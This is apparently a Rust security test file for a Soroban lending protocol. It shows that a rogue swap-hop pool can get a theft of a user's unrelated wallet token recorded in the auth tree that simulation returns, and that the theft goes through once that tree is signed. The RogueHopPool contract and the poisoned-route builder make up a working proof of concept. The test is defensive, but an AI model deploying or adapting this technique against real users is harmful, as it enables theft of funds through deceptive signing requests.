//! What the host does when code inside a route hop calls
//! `token.transfer(caller, third_party, x)` below the controller: recording mode
//! attaches it to the caller's entry; enforcing mode accepts it only if signed.

use common::types::HubAssetKey;
use soroban_sdk::testutils::{
    Address as _, AuthorizedFunction, AuthorizedInvocation, MockAuth, MockAuthInvoke,
};
use soroban_sdk::xdr::{
    AccountId, FromXdr, InvokeContractArgs, PublicKey, ScAddress, ScErrorType, ScVal,
    SorobanAuthorizationEntry, SorobanAuthorizedFunction, SorobanAuthorizedInvocation,
    SorobanCredentials, ToXdr, Uint256,
};
use soroban_sdk::{
    contract, contractimpl, contracttype, symbol_short, token, vec, Address, Bytes, Env, IntoVal,
    Symbol, TryFromVal, Val, Vec,
};
use test_harness::{hub_asset, LendingTest, ALICE};

const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed

#[contracttype]
#[derive(Clone)]
pub struct RoutedSwap {
    pub hop_pool: Address,
    pub min_out: i128,
    pub token_in: Address,
    pub token_out: Address,
}

/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}

struct Scene {
    t: LendingTest,
    alice: Address,
    attacker: Address,
    wallet_token: Address,
    account_id: u64,
}

impl Scene {
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
        let attacker = Address::generate(&t.env);
        Self {
            t,
            alice,
            attacker,
            wallet_token,
            account_id,
        }
    }

    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }

    fn assets(&self) -> (HubAssetKey, HubAssetKey) {
        (
            hub_asset(self.t.resolve_asset("USDC")),
            hub_asset(self.t.resolve_asset("ETH")),
        )
    }

    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
        match result {
            Ok(Ok(())) => Ok(()),
            Ok(Err(e)) => panic!("conversion error: {e:?}"),
            Err(Ok(e)) => Err(e),
            Err(Err(e)) => panic!("invoke error: {e:?}"),
        }
    }

    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
        self.try_swap(route)
    }

    fn wallet(&self, holder: &Address) -> i128 {
        token::Client::new(&self.t.env, &self.wallet_token).balance(holder)
    }

    fn diagnostics(&self) -> std::string::String {
        std::format!("{:?}", self.t.env.host().get_events().unwrap().0)
    }
}

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}

/// Controller stand-in: root-frame `caller.require_auth()`, then route-selected code.
#[contract]
pub struct RootAuthEntry;

#[contractimpl]
impl RootAuthEntry {
    pub fn run(env: Env, caller: Address, hop_pool: Address) {
        caller.require_auth();
        let _: Val = env.invoke_contract(&hop_pool, &symbol_short!("swap"), vec![&env]);
    }
}

/// `transfer` with the token-interface auth rule; records the movement.
#[contract]
pub struct RecordingToken;

#[contractimpl]
impl RecordingToken {
    pub fn transfer(env: Env, from: Address, to: Address, amount: i128) {
        from.require_auth();
        env.storage()
            .instance()
            .set(&symbol_short!("MOVED"), &(to, amount));
    }

    pub fn moved(env: Env) -> Option<(Address, i128)> {
        env.storage().instance().get(&symbol_short!("MOVED"))
    }
}

fn contract_fn(
    env: &Env,
    contract: &Address,
    fn_name: &str,
    args: Vec<Val>,
    children: std::vec::Vec<SorobanAuthorizedInvocation>,
) -> SorobanAuthorizedInvocation {
    let args: std::vec::Vec<ScVal> = args
        .iter()
        .map(|v| ScVal::try_from_val(env, &v).expect("auth arg converts"))
        .collect();
    SorobanAuthorizedInvocation {
        function: SorobanAuthorizedFunction::ContractFn(InvokeContractArgs {
            contract_address: ScAddress::from(contract),
            function_name: fn_name.try_into().expect("symbol"),
            args: args.try_into().expect("args fit"),
        }),
        sub_invocations: children.try_into().expect("children fit"),
    }
}

#[test]
fn source_account_credentials_bind_the_rogue_transfer_to_the_tree_without_an_entry_signature() {
    let env = Env::default();
    let account = AccountId(PublicKey::PublicKeyTypeEd25519(Uint256([7; 32])));
    env.host()
        .set_source_account(account.clone())
        .expect("source account");
    let wallet = Address::try_from_val(&env, &ScAddress::Account(account)).expect("G address");
    let attacker = Address::generate(&env);

    let entry = env.register(RootAuthEntry, ());
    let wallet_token = env.register(RecordingToken, ());
    let plan = (
        wallet.clone(),
        wallet_token.clone(),
        attacker.clone(),
        99i128,
    );
    let rogue_pool = env.register(RogueHopPool, plan);
    let run_args: Vec<Val> = (wallet.clone(), rogue_pool.clone()).into_val(&env);
    let as_source_account = |children| SorobanAuthorizationEntry {
        credentials: SorobanCredentials::SourceAccount,
        root_invocation: contract_fn(&env, &entry, "run", run_args.clone(), children),
    };
    let client = RootAuthEntryClient::new(&env, &entry);
    let token = RecordingTokenClient::new(&env, &wallet_token);

    env.set_auths(&[as_source_account(std::vec![])]);
    let refused = client
        .try_run(&wallet, &rogue_pool)
        .expect_err("a transfer outside the tree is unauthorized")
        .expect("host error");
    std::println!("source-account rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    let diagnostics = std::format!("{:?}", env.host().get_events().unwrap().0);
    assert!(diagnostics.contains("Unauthorized function call for address"));
    assert_eq!(token.moved(), None);

    let transfer_args: Vec<Val> = (wallet.clone(), attacker.clone(), 99i128).into_val(&env);
    let child = contract_fn(&env, &wallet_token, "transfer", transfer_args, std::vec![]);
    env.set_auths(&[as_source_account(std::vec![child])]);
    client.run(&wallet, &rogue_pool);
    assert_eq!(token.moved(), Some((attacker, 99)));
}
